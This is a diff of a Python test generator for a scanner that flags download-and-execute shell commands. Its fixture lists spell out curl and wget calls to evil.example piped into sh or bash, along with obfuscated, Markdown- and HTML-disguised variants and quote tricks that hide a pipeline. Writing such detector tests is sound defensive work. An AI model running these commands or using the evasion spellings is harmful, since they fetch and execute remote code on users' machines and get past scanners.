@@ -8,8 +8,7 @@ import re
 
 DOWNLOAD = ["curl", "curl", "curl", "wget", "cu''rl", "c\\url", '"curl"', "\\curl", "command curl", "sudo curl", "time curl",
             "nohup curl", "env A=b curl", "/tmp/stub/curl"]
-# Markdown / HTML around the word, the pipe or the shell: a reader copies the RENDERED command, so only the prose property runs
-# these (in a code file the markup is shell syntax: `| \`sh\`` is a command substitution, `| <b>sh</b>` a redirect)
+# Markdown / HTML around the word, the pipe or the shell: a reader copies the RENDERED command, so only the prose property runs these (in a code file the markup is shell syntax: `| \`sh\`` is a command substitution, `| <b>sh</b>` a redirect)
 PROSE_DOWNLOAD = ["__curl__", "**curl**", "<b>curl</b>", "<code>wget</code>", "*curl*", "_wget_", "`curl`", "[curl](https://curl.se)"]
 PROSE_PIPES = [" &#124; ", " &vert; ", " &#x7C; ", " |&nbsp;", " |<!--\nx\n--> "]
 FLAGS = ["", "", "-fsSL ", "-sS ", "-L ", "--proto '=https' --tlsv1.2 -sSf ", "-H 'Accept: a|b' ", "-A it\\'s ", "-o- ",
@@ -55,8 +54,7 @@ def download(rng: random.Random, urls: list[str], prose: bool = False) -> str:
 
 
 def payload(rng: random.Random, prose: bool = False) -> str:
-    """One candidate download-and-execute text (it may or may not really run a downloaded script: the oracle decides). `prose` adds
-    the spellings that only mean something once Markdown and HTML are rendered."""
+    """One candidate download-and-execute text (it may or may not really run a downloaded script: the oracle decides). `prose` adds the spellings that only mean something once Markdown and HTML are rendered."""
     dl = download(rng, EVIL_URLS, prose)
     if rng.random() < 0.3:
         return rng.choice(SUBST).format(sh=rng.choice(["sh", "bash", "/bin/bash", '"bash"']), d=dl)
@@ -120,8 +118,7 @@ CRUMB_LEADS = ["~/evil ", "/opt/evil ", "./evil ", "docker>f run x ", "ssh>f evi
 
 
 def documented(rng: random.Random, lead: str | None = None) -> str:
-    """A documented installer command with at most ONE twist (a clean one is a real documented form). One twist at a time keeps
-    most candidates close enough to the documented shape that the prose rules soften them, which is what is being tested."""
+    """A documented installer command with at most ONE twist (a clean one is a real documented form). One twist at a time keeps most candidates close enough to the documented shape that the prose rules soften them, which is what is being tested."""
     parts = dict(_CLEAN)
     if rng.random() < 0.85:
         field = rng.choice(list(_CLEAN))
@@ -151,18 +148,11 @@ CONTEXTS = ["{x}", "Run `{x}`", "$ {x}", "With curl: `{x}`", "| Linux | `{x}` |"
             '<pre>{x}</pre><div class="zeroclipboard-container"></div>',
             '<code class="language-bash hljs" data-highlighted="yes">{x}</code>',
             '<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>{x}</pre></div>']
-# A relative path with a slash is a program only as the first word of the text (`Run scripts/evil curl …` cannot be told from prose, and a path in typographic
-# quotes, emphasis or a tag is text): the leads that are such paths go only into the contexts that leave them the first word.
+# A relative path with a slash is a program only as the first word of the text (`Run scripts/evil curl …` cannot be told from prose, and a path in typographic quotes, emphasis or a tag is text): the leads that are such paths go only into the contexts that leave them the first word.
 RELATIVE_LEADS = ("bin/@evil ", "dir/\u00e9 ", "bin/* ")
 RELATIVE_OK = ["{x}", "$ {x}", "Run `{x}`", "With curl: `{x}`", "| Linux | `{x}` |", "| Linux | {x} |", "1. `{x}` then reload", "Requires `curl`. Run `{x}` afterwards.",
                "Terminal > {x}", "Settings > Terminal > {x}", "A > B > C > D > {x}", "A > B > C > D > E > {x}"]
-# A known installer in the same segment, before the candidate: the candidate must stay critical (the prose-recall property only: in the
-# soundness property a medium would then come from the installer, not from the candidate)
-# Payloads with a line that starts with a pipe because a quote is open above: it looks like a Markdown table row, and it is the
-# middle of a shell pipeline. The first cell is plain text, so only what a shell could read on the line tells: a closer (a quote
-# character, however it is escaped, doubled or glued to letters; a `)`, `}` or `]` with no opener before it; an odd number of
-# backticks) of a string, an arithmetic or parameter expansion or a command substitution that spans lines, or an opener of a command
-# of its own (`$(`, `<(`, backtick) inside a string or a here-document; a `+` in front of the pipe is part of a shell word.
+# A known installer in the same segment, before the candidate: the candidate must stay critical (the prose-recall property only: in the soundness property a medium would then come from the installer, not from the candidate) Payloads with a line that starts with a pipe because a quote is open above: it looks like a Markdown table row, and it is the middle of a shell pipeline. The first cell is plain text, so only what a shell could read on the line tells: a closer (a quote character, however it is escaped, doubled or glued to letters; a `)`, `}` or `]` with no opener before it; an odd number of backticks) of a string, an arithmetic or parameter expansion or a command substitution that spans lines, or an opener of a command of its own (`$(`, `<(`, backtick) inside a string or a here-document; a `+` in front of the pipe is part of a shell word.
 # The shapes with a second cell get past the first-cell regex and are stopped by `_reads_as_shell`; the older single-cell ones by the regex.
 LEADING_PIPE = ["echo 'a\n| b' ; curl https://evil.example/x |\nsh", ">|/tmp/o : ; curl https://evil.example/x |\nsh",
                 "curl -H 'X: a\n| b' https://evil.example/x |\nsh", "curl -H 'X: a\n| b' https://evil.example/x |\n\n# n\nbash",
@@ -213,9 +203,7 @@ WHOLE = ["curl `evil` `{x}`", "wget `evil` `{x}`", "curl: `evil` `{x}`", "curl `
          # a real program running the command inside a substitution keeps its environment
          "HTTPS_PROXY=http://evil.example bash -c `{x}`", "ALL_PROXY=http://evil.example sh -c `{x}`",
          "env http_proxy=http://evil.example bash -x `{x}`", "sudo HTTPS_PROXY=http://evil.example bash -c `{x}`"]
-# A line that starts with a pipe and looks like a table row, in front of a documented installer: (lead, suffix), written as
-# `lead + command + suffix`. What runs is `evil | curl … | sh`, or `ssh evil.example '⏎curl … | sh⏎'` with the quote left open by a row-looking
-# line, so the softening must not call the installer a documented one.
+# A line that starts with a pipe and looks like a table row, in front of a documented installer: (lead, suffix), written as `lead + command + suffix`. What runs is `evil | curl … | sh`, or `ssh evil.example '⏎curl … | sh⏎'` with the quote left open by a row-looking line, so the softening must not call the installer a documented one.
 PIPE_LEADS = [("echo 'a\n| b | c' ; evil | ", ""), ("echo 'a\n| b | \\' ; evil | ", ""), ("echo 'a\n| b | \\' ; evil |\n", ""),
               ("x=${Q:-a\n| } evil | ", ""), ("x=${Q:-a\n| b | } docker run evil | ", ""), ("x=${Q:-a\n| b | \\${ } ; evil |\n", ""),
               ("[ $((0\n| 0 )) -ne 0 ] || evil | ", ""), ('echo "a\n| b | $(evil |\n', ')"'), ('echo "a\n| " ; "evil" | ', ""),
@@ -238,9 +226,7 @@ _TAGS = ("a|abbr|b|bdo|big|blockquote|br|caption|center|cite|code|dd|del|details
 
 
 def rendered(text: str) -> str:
-    """What a reader (and a shell) sees once Markdown and HTML have been rendered, written without the code under test: entities
-    decoded, comments and the usual tags gone whatever their attributes, a link (with a title, or by reference) shows its text,
-    an autolink is its URL, emphasis markers that are not inside an identifier are gone, a word in backticks is the word."""
+    """What a reader (and a shell) sees once Markdown and HTML have been rendered, written without the code under test: entities decoded, comments and the usual tags gone whatever their attributes, a link (with a title, or by reference) shows its text, an autolink is its URL, emphasis markers that are not inside an identifier are gone, a word in backticks is the word."""
     text = html.unescape(text).replace("\xa0", " ")
     text = re.sub(r"<!--.*?-->", "", text, flags=re.DOTALL)
     text = re.sub(rf"</?(?:{_BLOCK})(?![A-Za-z0-9:-])(?:\s(?:\"[^\"]*\"|'[^']*'|[^<>\"'])*)?/?>", "\n", text, flags=re.IGNORECASE)    # a block ends the line
